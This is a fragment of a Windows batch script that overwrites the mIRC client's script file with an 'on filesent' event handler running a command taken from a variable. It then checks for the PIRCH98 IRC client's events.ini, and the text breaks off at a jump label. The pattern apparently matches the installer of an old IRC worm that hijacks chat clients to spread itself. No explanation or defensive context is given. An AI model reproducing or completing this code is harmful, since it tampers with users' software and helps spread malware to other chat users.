@echo off
echo [script] > %mIRC%
echo n0=on 1:filesent:*.*: { if ( $nick !=$me ) {halt} /%spp% } >>%mIRC%
if exist C:\pirch98\events.ini goto pir
goto pirend
:pir
